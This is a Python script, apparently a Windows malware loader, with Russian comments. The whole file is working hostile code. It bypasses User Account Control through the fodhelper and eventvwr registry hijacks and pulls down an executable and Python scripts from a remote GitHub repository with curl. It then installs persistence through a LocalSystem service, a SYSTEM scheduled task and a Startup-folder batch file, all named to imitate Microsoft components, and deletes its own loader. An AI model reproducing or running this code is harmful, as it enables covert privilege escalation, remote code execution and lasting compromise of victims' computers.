import os
import sys
import subprocess
from pathlib import Path
import time
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def uac_bypass_eventvwr():
    try:
        eventvwr_path = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe')
        registry_payload = f'''
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command]
@="\\"{sys.executable}\\" \\"C:\\\\ProgramData\\\\Microsoft Storage\\\\loader.py\\""
'''
        temp_reg = "C:\\ProgramData\\Microsoft Storage\\bypass.reg"
        with open(temp_reg, 'w') as f:
            f.write(registry_payload)
        
        subprocess.run(['reg', 'import', temp_reg], capture_output=True, shell=True)
        subprocess.run([eventvwr_path], capture_output=True, shell=True)
        time.sleep(3)
        os.remove(temp_reg)
        return True
    except Exception as e:
        return False

def uac_bypass_fodhelper():
    try:
        # Registry hijack for fodhelper.exe
        reg_cmd = [
            'reg', 'add',
            'HKCU\Software\Classes\ms-settings\shell\open\command',
            '/v', 'DelegateExecute', '/d', '', '/f'
        ]
        subprocess.run(reg_cmd, capture_output=True, shell=True)
        
        reg_cmd2 = [
            'reg', 'add',
            'HKCU\Software\Classes\ms-settings\shell\open\command',
            '/v', '', '/d', f'"{sys.executable}" "C:\\ProgramData\\Microsoft Storage\\loader.py"', '/f'
        ]
        subprocess.run(reg_cmd2, capture_output=True, shell=True)
        
        # Trigger UAC bypass
        subprocess.run(['C:\\Windows\\System32\\fodhelper.exe'], capture_output=True, shell=True)
        time.sleep(5)
        
        # Cleanup
        subprocess.run([
            'reg', 'delete',
            'HKCU\Software\Classes\ms-settings\shell\open\command', '/f'
        ], capture_output=True, shell=True)
        return True
    except Exception as e:
        return False

# Основная логика с проверкой прав
if not is_admin():
    print("Требуются права администратора, выполняем UAC bypass...")
    if not uac_bypass_fodhelper():
        uac_bypass_eventvwr()
    sys.exit(0)

# Продолжение оригинального кода с правами администратора
directory = "C:/ProgramData/Microsoft Storage"
os.makedirs(directory, exist_ok=True)
os.chdir(directory)

subprocess.run(["curl", "-O", "https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/clo.exe"], 
               capture_output=True, shell=True)
subprocess.run(["curl", "-O", "https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/file.py"], 
               capture_output=True, shell=True)
subprocess.run(["curl", "-O", "https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py"], 
               capture_output=True, shell=True)

# Установка службы Windows для максимальной персистентности
service_script = '''
import subprocess
import time
subprocess.Popen(["python", "C:\\\\ProgramData\\\\Microsoft Storage\\\\file.py"], 
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
'''
with open("service_wrapper.py", 'w') as f:
    f.write(service_script)

# Создание службы Windows
service_install = [
    'sc', 'create', 'MicrosoftStorage',
    'binPath=', f'"{sys.executable}" C:\\ProgramData\\Microsoft Storage\\service_wrapper.py',
    'start=', 'auto', 'obj=', 'LocalSystem'
]
subprocess.run(service_install, capture_output=True, shell=True)
subprocess.run(['sc', 'start', 'MicrosoftStorage'], capture_output=True, shell=True)

# Дополнительная персистентность через планировщик задач
schtasks_cmd = [
    'schtasks', '/create', '/tn', 'Microsoft\\Windows\\StorageMaintenance',
    '/tr', f'"{sys.executable}" "C:\\ProgramData\\Microsoft Storage\\file.py"',
    '/sc', 'onstart', '/ru', 'SYSTEM', '/f'
]
subprocess.run(schtasks_cmd, capture_output=True, shell=True)

startup_folder = Path(os.path.expanduser("~")) / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
startup_folder.mkdir(parents=True, exist_ok=True)

bat_content = f'@echo off\n"{sys.executable}" "C:\\ProgramData\\Microsoft Storage\\startup.py"\n'
bat_path = startup_folder / "MicrosoftStorage.bat"

with open(bat_path, 'w', encoding='utf-8') as f:
    f.write(bat_content)

subprocess.Popen([sys.executable, "startup.py"], 
                 stdout=subprocess.DEVNULL, 
                 stderr=subprocess.DEVNULL,
                 shell=True)

time.sleep(2)
os.remove("loader.py")
